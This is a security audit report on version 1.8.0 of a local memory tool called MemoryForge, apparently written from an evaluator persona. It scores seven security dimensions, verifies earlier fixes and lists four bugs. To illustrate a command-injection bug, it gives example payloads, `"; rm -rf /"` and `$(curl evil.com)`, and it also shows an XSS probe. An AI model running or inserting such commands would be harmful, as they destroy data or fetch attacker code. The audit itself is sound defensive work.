# MemoryForge v1.8.0 — Security Engineer Benchmark (Round 8)

**Evaluator Persona:** Security Engineer (10% market share)
**Benchmark Date:** 2026-02-15
**Version Evaluated:** 1.8.0 (Waves 1-21 complete)
**Baseline:** Round 7 Security Engineer Score: 9.29/10

---

## Executive Summary

MemoryForge v1.8.0 delivers a strong set of fixes from Wave 21: the session-start.sh config loader now uses `lstatSync()` for symlink resistance (R7 Bug #1 P2 fix), `appendMindFile` is now atomic with the read+tmp+rename pattern (R7 Bug #2 P2 fix), `KNOWN_CONFIG_KEYS` has been extracted to a shared module eliminating the duplication consistency risk (R7 Bug #3 P3 fix), `.write-lock` was added to `.gitignore` (R7 Bug #4 P3 fix), per-field validation now uses `Buffer.byteLength()` for correct byte-level enforcement (R7 Bug #5 P3 fix), and `withContentionWarning` has a defensive empty-content check (R7 Bug #6 P3 fix).

The new `setup.js` interactive installer introduces a clean, guided installation experience. Its security surface is well-bounded: it copies files from known source locations, validates user inputs (parseInt bounds-checking on config values), and does not introduce any new injection vectors.

No P1 vulnerabilities were found. One P2 issue was identified: a command injection vector in health-check.js `--watch` mode where user-supplied CLI arguments are interpolated into an `execSync()` shell string. Three P3 hardening opportunities were found. The codebase continues its trajectory of strong security engineering with zero external dependencies, consistent defense-in-depth, and growing test coverage.

**Verdict:** **YES -- Recommend for adoption**

The P2 command injection in health-check.js `--watch` mode requires local CLI access and crafted arguments to exploit. It does not affect normal MCP server operation, hook execution, or the core memory system. All R7 high-priority recommendations have been addressed.

---

## Dimension Scores

| Dimension | Score | R7 Score | Change |
|-----------|-------|----------|--------|
| D1: Supply Chain | 10 | 10 | -- |
| D2: Input Validation | 9 | 9 | -- |
| D3: Injection Safety | 9 | 9 | -- |
| D4: Data Handling | 9 | 9 | -- |
| D5: Config Security | 10 | 9 | +1 |
| D6: CI & Testing | 10 | 10 | -- |
| D7: Audit & Logging | 9 | 9 | -- |
| **Average** | **9.43** | **9.29** | **+0.14** |

---

## D1: Supply Chain -- 10/10 (R7: 10, unchanged)

**What it measures:** Dependencies, pinning, build process, external service calls.

### Strengths
1. **Zero npm dependencies** -- entire codebase uses Node.js built-ins only (fs, path, readline, child_process, os, assert). No `package.json`, no `node_modules/`, no supply chain attack surface.
2. **No external service calls** -- fully offline operation. No telemetry, no analytics, no API requests, no CDN dependencies.
3. **No build step** -- pure JavaScript and bash. No transpilation, bundling, or minification.
4. **CI pinning** -- GitHub Actions use pinned major versions (`actions/checkout@v4`, `actions/setup-node@v4`) (ci.yml:20-24).
5. **Node.js version matrix** -- tested on Node 18/20/22 across 3 OS platforms (ci.yml:12-14).
6. **shellcheck linting at error severity** -- static analysis of all bash scripts in CI (ci.yml:70).
7. **No credential requirements** -- runs as unprivileged user. No sudo, no admin elevation, no API keys.
8. **New: `setup.js` installer** -- zero dependencies, uses only Node.js built-in `readline` for interactive prompts. No network calls during setup.

### Security Analysis
- **Package.json:** Intentionally absent -- zero npm supply chain risk
- **Installers validate Node.js** before proceeding (install.sh:37-46, install.ps1:36-47, setup.js:121-128)
- **All scripts use `#!/usr/bin/env node`** -- no hardcoded interpreter paths
- **No curl/wget download chains** -- all code is git-cloned and locally auditable
- **setup.js copies from known source paths** (SCRIPT_DIR-relative), does not download or fetch anything

### Bugs Found
None.

**Score: 10/10** -- Best-in-class. Zero external dependencies, no build process, no network calls. The new `setup.js` maintains the same zero-dependency standard.

---

## D2: Input Validation -- 9/10 (R7: 9, unchanged)

**What it measures:** Per-field type/length/character restrictions, sanitization, size limits.

### Strengths
1. **Size limits enforced:**
   - MCP tool inputs: 50KB cap (mcp-memory-server.js:27)
   - Per-field string limit: 5KB via `Buffer.byteLength()` -- **fixed in v1.8.0** to measure bytes, not string `.length` (mcp-memory-server.js:28, 669)
   - MCP messages: 10MB cap to prevent OOM (mcp-memory-server.js:29, 766)
   - File size guard: `buildIndex()` skips files >10MB (vector-memory.js:282-283)
2. **Field validation:**
   - Required fields checked against inputSchema (mcp-memory-server.js:701-716)
   - Per-field byte-level validation for top-level strings and array string elements (mcp-memory-server.js:665-699)
   - Numeric validation with `Number.isSafeInteger()` in compress-sessions.js:65, health-check.js:80
   - Shell variable numeric validation via `case` patterns in all hooks (user-prompt-context.sh:42-43, stop-checkpoint.sh:86-87, session-end.sh:42-43, session-start.sh:51)
3. **Schema validation:**
   - `KNOWN_CONFIG_KEYS` shared module (config-keys.js:8-19) -- **NEW in v1.8.0**, single source of truth
   - Unknown config keys flagged with warning (health-check.js:71, compress-sessions.js:47)
   - Config bounds-checked with sane minimums (compress-sessions.js:63-73, health-check.js:87-96)
4. **setup.js input validation:**
   - `parseInt()` with bounds checking on config values (setup.js:463-478)
   - Upper bounds enforced (e.g., `num <= 100` for sessions, `num <= 365` for archive days)
   - Default values provided when input is empty or out of range

### Remaining Gaps
- Per-field validation does not recurse into nested objects (only checks top-level string fields and top-level array elements). This is acceptable since no tool schema defines nested object parameters.
- No character-set restriction on string fields (e.g., control characters in tool inputs would be written to .mind/ files as-is). Low risk since files are markdown and the MCP server is not serving HTML.

### Bugs Found
None new for this dimension.

**Score: 9/10** -- Strong. The `Buffer.byteLength()` fix correctly measures multi-byte characters now. The shared KNOWN_CONFIG_KEYS module eliminates the previous consistency risk.

---

## D3: Injection Safety -- 9/10 (R7: 9, unchanged)

**What it measures:** Shell injection, path traversal, regex injection, command injection in all code paths.

### Strengths
1. **Path traversal blocked** -- `safePath()` in mcp-memory-server.js:62-68 validates all file access stays within `.mind/`. Uses `path.resolve()` + `startsWith()` check.
2. **Shell injection prevention:**
   - Config read in hooks passes paths via `process.env.MEMORYFORGE_CONFIG`, never interpolated into shell strings (session-start.sh:63, stop-checkpoint.sh:76-77)
   - Hook stdin data parsed via piped `node -e` scripts with `process.stdin.on('data')`, not interpolated into shell
   - `$MIND_DIR` and `$PROJECT_DIR` sourced from `$CLAUDE_PROJECT_DIR` environment variable, not user-controlled input
3. **Regex injection blocked:**
   - Section names escaped with `replace(/[.*+?^${}()|[\]\\]/g, '\\$&')` before regex construction (mcp-memory-server.js:407, 463)
   - Heading length capped at 200 characters before regex construction to prevent ReDoS (mcp-memory-server.js:462)
4. **No `eval()`** -- no dynamic code evaluation anywhere in the codebase
5. **No SQL/NoSQL** -- no database queries, no injection surface
6. **`setup.js` safe operations:**
   - `copyFileSync()` and `mkdirSync()` only -- no shell interpolation of user input
   - `chmod +x` uses quoted glob path (setup.js:270)
   - `mergeSettings()` and `mergeMcpJson()` parse JSON safely, no string interpolation

### Remaining Concerns
1. **health-check.js `--watch` mode command injection** -- `watchArgs` is built from `process.argv` and interpolated into an `execSync()` shell string (health-check.js:226-227). A crafted CLI argument like `$(malicious)` could execute arbitrary commands. See Bug #1 below.
2. **dashboard.js `exec()` with `outPath`** -- The output path `path.join(mindDir, "dashboard.html")` is double-quoted in the `exec()` call (dashboard.js:330-333), but if `mindDir` contains shell metacharacters (unlikely since it derives from `.mind` under the project dir), it could break out. Low risk.
3. **fleet-dashboard.js `execSync()` with `outputPath`** -- Same pattern: `outputPath` interpolated into shell string (fleet-dashboard.js:275-277). Low risk since path derives from `path.resolve(parentDir)`.

### Bugs Found

**Bug #1 (P2): Command injection in health-check.js --watch mode**
- **File:** `scripts/health-check.js:226-227`
- **Details:** The `--watch` mode filters CLI args and joins them into a shell command via `execSync()`. User-supplied positional arguments (the project directory path) are interpolated unsanitized into the shell string. A crafted path argument like `"; rm -rf /"` or `$(curl evil.com)` would execute arbitrary commands every `watchInterval` seconds. While this requires local CLI access and is a non-default mode, it is a clear command injection vector.
- **Code:** `const watchArgs = args.filter(a => a !== '--watch' && !a.startsWith('--interval')).join(' ');` followed by `` execSync(`node "${__filename}" ${watchArgs}`, { timeout: 10000 }) ``
- **Mitigation:** Use `execFileSync('node', [__filename, ...filteredArgs])` instead, which avoids shell interpretation entirely.

**Score: 9/10** -- Strong injection safety overall. The health-check.js `--watch` mode injection (P2) is the one blemish, but it requires local CLI access and is not reachable via MCP protocol or hooks.

---

## D4: Data Handling -- 9/10 (R7: 9, unchanged)

**What it measures:** Data locality, cross-project isolation, secrets exposure, .gitignore coverage.

### Strengths
1. **Data locality** -- all data stays in `.mind/` under the project root. No cloud sync, no external storage.
2. **Cross-project isolation** -- `CLAUDE_PROJECT_DIR` scopes all file operations. `findMindDir()` walks up at most 10 levels (mcp-memory-server.js:42).
3. **No secrets in defaults** -- template config has only numeric tuning values (templates/memoryforge.config.json.template). No API keys, tokens, or credentials anywhere.
4. **`.gitignore` coverage (project-generated):**
   - Installer adds: `.last-activity`, `.agent-activity`, `.task-completions`, `.session-tracking`, `.file-tracker`, `.write-lock`, `.prompt-context`, `.mcp-errors.log`, `ARCHIVE.md`, `dashboard.html`, `checkpoints/`, `*.pre-compress`
   - **`.write-lock` now included** -- fixed in v1.8.0
5. **Atomic writes** -- `writeMindFile()` and `appendMindFile()` both use tmp+rename pattern (mcp-memory-server.js:110-117, 124-134). **`appendMindFile` fixed in v1.8.0** to also be atomic.
6. **setup.js data handling** -- copies only from known template paths, does not read or exfiltrate existing project data.

### Remaining Gaps
1. **Project `.gitignore` incomplete** -- The repo's own `.gitignore` (D:\MemoryForge\.gitignore) is missing several entries that the installer adds to target projects: `.mind/.file-tracker`, `.mind/.prompt-context`, `.mind/.mcp-errors.log`, `.mind/ARCHIVE.md`, `.mind/dashboard.html`, `*.pre-compress`. This means if someone works directly in the MemoryForge repo, these files could be accidentally committed. See Bug #2.
2. **Error log path leakage** -- `.mcp-errors.log` records full stack traces with absolute file paths. The file is gitignored in target projects, but could leak directory structure if shared. Previously noted in R6/R7, accepted risk.

### Bugs Found

**Bug #2 (P3): Project's own .gitignore is less comprehensive than installer-generated .gitignore**
- **File:** `.gitignore:1-20`
- **Details:** The MemoryForge repository's own `.gitignore` covers `.mind/.last-activity`, `.mind/.agent-activity`, `.mind/.task-completions`, `.mind/.session-tracking`, `.mind/.write-lock`, `.mind/checkpoints/` -- but is missing entries that the installer (install.sh:633-647, setup.js:354-369) adds to target projects: `.mind/.file-tracker`, `.mind/.prompt-context`, `.mind/.mcp-errors.log`, `.mind/ARCHIVE.md`, `.mind/dashboard.html`, `*.pre-compress`. If developers test MemoryForge features locally, these files could be accidentally committed.

**Score: 9/10** -- Excellent data locality and isolation. The atomic `appendMindFile` fix is a meaningful improvement. The gitignore discrepancy is cosmetic for end users (their gitignore is correct) but a minor hygiene issue for the repo itself.

---

## D5: Config Security -- 10/10 (R7: 9, +1)

**What it measures:** Config loading safety, value validation, symlink resistance, arithmetic injection.

### Strengths
1. **Symlink resistance on all config loaders:**
   - compress-sessions.js:43-44 -- `lstatSync()` check, refuses symlinks
   - health-check.js:61-63 -- `lstatSync()` check, reports "Config is a symlink"
   - pre-compact.sh inline Node:51-52 -- `lstatSync()` check
   - session-start.sh:62 -- bash `[ ! -L ]` symlink check on shell-level config read
   - session-start.sh inline Node:110-111 -- `lstatSync()` check on Node-level config read -- **NEW in v1.8.0 (P2 fix from R7)**
   - stop-checkpoint.sh:75 -- bash `[ ! -L ]` symlink check
   - **All config loaders now have symlink resistance** -- the R7 Bug #1 gap in session-start.sh inline Node is closed
2. **Shared config schema:**
   - `KNOWN_CONFIG_KEYS` extracted to `scripts/config-keys.js` -- **NEW in v1.8.0 (P3 fix from R7)**
   - Used by both health-check.js:32 and compress-sessions.js:29
   - Single source of truth eliminates consistency risk from R7
3. **Value validation:**
   - `Number.isSafeInteger()` catches extreme values like `1e308` (compress-sessions.js:65, health-check.js:80)
   - Minimum bounds enforced for all numeric config keys (compress-sessions.js:68-73, health-check.js:87-96)
   - `safeInt()` helper returns fallback on invalid values (compress-sessions.js:63-67)
4. **setup.js config creation:**
   - Interactive config values validated with `parseInt()` + bounds checking (setup.js:463-478)
   - Upper bounds prevent absurd values (sessions <= 100, days <= 365)
   - Default values used when input is invalid

### Why +1 from R7
- The session-start.sh inline Node config loader now uses `fs.lstatSync()` instead of `fs.existsSync()`, closing the last symlink gap (R7 Bug #1, P2)
- `KNOWN_CONFIG_KEYS` extracted to shared module, eliminating the duplication risk (R7 Bug #3, P3)
- Both P2 and P3 config-related R7 bugs are fully resolved

### Bugs Found
None.

**Score: 10/10** -- All config loaders now have consistent symlink resistance, shared schema validation, and `Number.isSafeInteger()` bounds checking. Config security is now comprehensive across every code path.

---

## D6: CI & Testing -- 10/10 (R7: 10, unchanged)

**What it measures:** Test coverage of security-critical paths, SAST, platform matrix, hook testing.

### Strengths
1. **Platform matrix:** 3 OS (Ubuntu, macOS, Windows) x 3 Node versions (18, 20, 22) = 9 configurations (ci.yml:12-14)
2. **4 test suites:**
   - `mcp-server.test.js` -- 20 tests (MCP tools, transport, security guards)
   - `compress.test.js` -- 9 tests (compression, archival, rotation, config overrides)
   - `vector-memory.test.js` -- 14 tests (tokenization, stemming, TF-IDF, chunking, serialization)
   - `hooks.test.js` -- 7+ tests (lifecycle, caching, checkpoint rotation, config validation, symlink rejection)
3. **Security-critical test coverage:**
   - Path traversal tests (mcp-server.test.js:346-385)
   - Oversized input rejection (mcp-server.test.js:333-344)
   - Per-field size limit (mcp-server.test.js:449-462)
   - Multi-byte character handling (mcp-server.test.js:388-403)
   - Lock contention detection (mcp-server.test.js:465-495)
   - Symlink config rejection (mcp-server.test.js:498-531, hooks.test.js:290-313)
   - Unknown config key detection (hooks.test.js:235-262)
   - `Number.isSafeInteger()` validation (hooks.test.js:264-288)
   - Checkpoint rotation boundary (hooks.test.js:186-231)
4. **Static analysis:**
   - `shellcheck -s bash -S error` on all hook scripts and install.sh (ci.yml:70)
   - `node --check` syntax verification on all JavaScript files (ci.yml:51-56)
   - JSON template validation (ci.yml:59)
5. **No setup.js tests** -- the interactive installer is not tested in CI. This is acceptable since it requires interactive input (readline), and the underlying file operations (copyFileSync, mkdirSync, JSON.parse) are tested through the other suites.

### Remaining Gaps
- No automated security scanning tool (e.g., npm audit is N/A since no deps, but could add CodeQL or Semgrep)
- No fuzz testing of MCP protocol parser
- setup.js lacks automated testing (interactive readline prevents easy CI integration)

### Bugs Found
None.

**Score: 10/10** -- Comprehensive test matrix, security-critical paths well-covered, shellcheck linting, syntax checking. The test suite provides strong confidence in security controls.

---

## D7: Audit & Logging -- 9/10 (R7: 9, unchanged)

**What it measures:** Structured logs, tool invocation records, error logging, log rotation, tamper detection.

### Strengths
1. **Error logging:**
   - `logError()` function writes timestamped entries to `.mcp-errors.log` (mcp-memory-server.js:791-799)
   - Uncaught exceptions and unhandled rejections logged (mcp-memory-server.js:801-802)
   - Tool call errors logged with label (mcp-memory-server.js:722)
2. **Log rotation:**
   - `.mcp-errors.log` rotated to 500 lines when >100KB (session-start.sh:37-43)
   - Tracking files rotated to 100 lines in session-start.sh:47-56
   - Tracking files also rotated by compress-sessions.js:333-352
   - `.pre-compress` backups pruned to max 3 (compress-sessions.js:357-377)
3. **Session tracking:**
   - `.last-activity` timestamp on every stop-checkpoint (stop-checkpoint.sh:26)
   - `.session-tracking` entries on session end (session-end.sh:31)
   - `.agent-activity` entries on subagent stop (subagent-stop.sh:37)
   - File change tracking via git (stop-checkpoint.sh:44-70)
4. **Lock contention surfaced:**
   - `withContentionWarning()` appends warning to tool responses when lock acquisition fails (mcp-memory-server.js:141-147)
   - **Defensive check for empty content** added in v1.8.0 (mcp-memory-server.js:142)
5. **Health check reporting:**
   - Structured JSON output with severity levels (health-check.js:111-129)
   - Watch/daemon mode for continuous monitoring (health-check.js:220-232)
   - Config validation reported in health output (health-check.js:169-173)

### Remaining Gaps
- **No structured audit log for successful tool invocations** -- only errors are logged; successful `memory_update_state`, `memory_save_decision`, etc. calls leave no audit trail
- **No tamper detection** -- `.mind/` files can be modified by any process; no checksums, signatures, or integrity verification
- **Error logs contain full stack traces** with absolute paths -- potential information leakage if shared
- **No log format standardization** -- `.mcp-errors.log` uses plaintext `[timestamp] label: message`, tracking files use ad-hoc formats

### Bugs Found
None new for this dimension.

**Score: 9/10** -- Good error logging with rotation. The contention warning is now correctly guarded against empty content. Missing structured audit trail for successful operations prevents reaching 10.

---

## Bug List

| # | Severity | Description | File:Line |
|---|----------|-------------|-----------|
| 1 | **P2** | **Command injection in health-check.js --watch mode** -- CLI arguments are string-interpolated into `execSync()` shell command. A crafted directory argument like `"; malicious-command"` would execute arbitrary code every watch interval. | `scripts/health-check.js:226-227` |
| 2 | **P3** | **Project's own .gitignore less comprehensive than installer-generated .gitignore** -- The repo's `.gitignore` is missing `.mind/.file-tracker`, `.mind/.prompt-context`, `.mind/.mcp-errors.log`, `.mind/ARCHIVE.md`, `.mind/dashboard.html`, `*.pre-compress` entries that the installer adds. | `.gitignore:1-20` |
| 3 | **P3** | **dashboard.js HTML output does not sanitize embedded data for XSS** -- The `md()` function escapes `<`, `>`, `&` before markdown conversion, but the stat-card values (`currentPhase`, `timestamp`, stat numbers) are interpolated directly into the HTML template (dashboard.js:271-291). While `currentPhase` is extracted from a user-controlled STATE.md file, the escaping in `md()` is applied separately. The stat cards use `.substring(0, 25)` but no HTML encoding on `currentPhase` itself. If STATE.md contains `<script>alert(1)</script>` in the phase field, it would be rendered. Dashboard is local-only (file:// protocol), so risk is low -- but defense-in-depth would apply `escapeHtml()` to all interpolated values. | `scripts/dashboard.js:288` |
| 4 | **P3** | **setup.js does not check for symlinks on existing config file before overwriting** -- When `setup.js` writes `.memoryforge.config.json` (setup.js:482), it uses `fs.writeFileSync()` without a prior `lstatSync()` symlink check. Other config writers in the codebase consistently check for symlinks. Low risk since setup is interactive and user-initiated, but inconsistent with the codebase's defense-in-depth pattern. | `setup.js:482` |

---

## Wave 21 Fix Verification

| R7 Bug | Fix Claimed | Fix Verified | Notes |
|--------|-------------|--------------|-------|
| P2: session-start.sh symlink check on inline Node config loader | `lstatSync()` instead of `existsSync()` | **Verified** | session-start.sh:110-111: `const st = fs.lstatSync(cfgPath); if (!st.isSymbolicLink() && st.isFile())` -- correct pattern |
| P3: KNOWN_CONFIG_KEYS extracted to shared module | scripts/config-keys.js | **Verified** | config-keys.js:8-19 defines the Set, imported by health-check.js:32 and compress-sessions.js:29 |
| P3: .write-lock added to .gitignore | Added | **Verified** | .gitignore:6: `.mind/.write-lock` present. Also in installer gitignore entries (install.sh:640, setup.js:363) |
| P3: Per-field limit uses Buffer.byteLength | bytes not string .length | **Verified** | mcp-memory-server.js:669: `const bytes = Buffer.byteLength(val, 'utf-8')` -- correct byte measurement |
| P3: withContentionWarning defensive check for empty content | Empty content guard | **Verified** | mcp-memory-server.js:142: `if (contention && result.content && result.content[0])` -- prevents crash on empty content |
| P2: appendMindFile now atomic | read+append+tmp+rename | **Verified** | mcp-memory-server.js:120-135: reads existing, writes to tmpPath, renames -- matches writeMindFile pattern |

All 6 claimed fixes are verified and correctly implemented.

---

## New Attack Surface: setup.js

The interactive installer (`setup.js`) was audited as a new attack surface:

### Positive Findings
1. **No network calls** -- purely local file operations
2. **No shell interpolation of user input** -- `readline` input is used as file paths via `path.resolve()`, never passed to `exec()`/`execSync()` except `chmod +x` with a hardcoded glob pattern (setup.js:270)
3. **Input validation** -- config values validated with `parseInt()` + range checks (setup.js:463-478)
4. **Existing file preservation** -- `copyIfMissing()` does not overwrite existing files (setup.js:102-111)
5. **JSON merge functions** are safe -- `mergeSettings()` and `mergeMcpJson()` use `JSON.parse()`/`JSON.stringify()`, no string interpolation (setup.js:141-187)

### Minor Concerns
1. **No symlink check on config write** (Bug #4 above)
2. **Directory creation follows user input** -- `fs.mkdirSync(targetDir, { recursive: true })` at setup.js:228 creates arbitrary directories based on user input. Acceptable since the user is running the script interactively and explicitly confirms.
3. **No --dry-run mode** -- unlike install.sh and install.ps1, setup.js has no preview mode. The user can see steps as they execute but cannot preview without side effects.

### Verdict
`setup.js` is well-implemented with minimal attack surface. The lack of `exec()` with user-controlled input (except the safe `chmod` with hardcoded path) makes it injection-resistant. The missing symlink check on config write is a minor inconsistency (Bug #4).

---

## Detailed Injection Analysis

All `exec()`/`execSync()` call sites reviewed:

| File | Line | Pattern | Risk | Verdict |
|------|------|---------|------|---------|
| dashboard.js:335 | `exec(cmd)` where `cmd` uses `outPath` | `outPath = path.join(mindDir, "dashboard.html")` -- derived from CLI arg or default `.mind`. Double-quoted. | Low | **Acceptable** -- path is not user-controlled content |
| fleet-dashboard.js:275-277 | `execSync(open/start/xdg-open "${outputPath}")` | `outputPath` derived from resolved `parentDir` + hardcoded filename. Double-quoted. | Low | **Acceptable** -- path is resolved from CLI arg |
| health-check.js:227 | `execSync(node "${__filename}" ${watchArgs})` | **`watchArgs` built from unvalidated CLI args** | **HIGH** | **Bug #1 (P2)** -- args not shell-escaped |
| setup.js:133 | `execSync('claude --version')` | Hardcoded command | None | Safe |
| setup.js:270 | `execSync(chmod +x "${hooksDir}"/*.sh)` | `hooksDir` is path-derived, not user content | Low | **Acceptable** |

All `node -e` invocations in hooks reviewed:

| File | Usage | Risk | Verdict |
|------|-------|------|---------|
| session-start.sh:28-31 | Piped stdin to parse JSON | None | Safe -- stdin piped, not interpolated |
| session-start.sh:63-65 | Config read via `process.env.MEMORYFORGE_CONFIG` | None | Safe -- env var, not shell interpolation |
| session-start.sh:97-245 | Inline Node with `$MIND_DIR` and `$SOURCE` as `process.argv` | None | Safe -- passed as arguments, not interpolated into code |
| pre-compact.sh:33-36 | Piped stdin to parse JSON | None | Safe |
| pre-compact.sh:39-147 | Inline Node with `$MIND_DIR` and `$TRIGGER` as argv | None | Safe |
| user-prompt-context.sh:71-78 | `$CONTEXT` passed as `process.argv[1]` | None | Safe -- argument, not code |
| stop-checkpoint.sh:32-35 | Piped stdin to parse JSON | None | Safe |
| stop-checkpoint.sh:76-78 | Config read via `process.env.MEMORYFORGE_CONFIG` | None | Safe |
| stop-checkpoint.sh:94-102 | `$STALE_MINUTES` passed as `process.argv[1]` | None | Safe |
| session-end.sh:25-28 | Piped stdin to parse JSON | None | Safe |
| subagent-stop.sh:24-47 | Piped stdin, env vars for paths | None | Safe |
| install.sh:260-272, 542-548 | `process.env.MCP_FILE` / `process.env.MF_FILE` for paths | None | Safe -- env vars |

---

## Recommendations (Priority Order)

### High Priority
1. **Fix health-check.js --watch command injection (Bug #1)** -- Replace `execSync()` shell string interpolation with `execFileSync('node', [__filename, ...filteredArgs])` to avoid shell interpretation of user-supplied arguments.

### Medium Priority
2. **Align project .gitignore with installer .gitignore (Bug #2)** -- Add missing entries to the repo's own `.gitignore` for hygiene.
3. **HTML-encode stat card values in dashboard.js (Bug #3)** -- Apply `escapeHtml()` to `currentPhase` and other interpolated values in the HTML template, consistent with the `md()` function's approach.

### Low Priority
4. **Add symlink check to setup.js config write (Bug #4)** -- Add `lstatSync()` check before writing `.memoryforge.config.json` in setup.js, consistent with all other config loaders.
5. **Add setup.js to CI syntax check** -- The `lint` job checks 6 JS files (ci.yml:51-56) but does not include `setup.js`. Add `node --check setup.js` for consistency.
6. **Consider structured logging** -- Replace plaintext `.mcp-errors.log` with JSON-structured entries for better parsing and analysis.

---

## Verdict

### YES -- Recommend for org-wide adoption

**Rationale:**
- **Zero P1 vulnerabilities** found
- **1 P2 vulnerability** (health-check.js --watch command injection) is in a non-default CLI mode, requires local access, and does not affect the core MCP server, hooks, or memory system
- **All 6 R7 fixes verified** and correctly implemented
- **Supply chain risk: zero** -- no external dependencies
- **Defense-in-depth is consistent** -- symlink checks, path traversal guards, size limits, regex escaping, atomic writes, and advisory locking are applied systematically across the codebase
- **Test coverage is strong** -- 50+ tests covering security-critical paths, 9-configuration CI matrix, shellcheck, and syntax verification
- **New setup.js** has minimal attack surface and does not introduce injection vectors

The codebase demonstrates mature security engineering. The trajectory from R6 (9.00) to R7 (9.29) to R8 (9.43) shows consistent incremental improvement. Each round's bugs are addressed in the subsequent wave, and no regressions have been introduced.

**Score: 9.43/10** (+0.14 from R7)
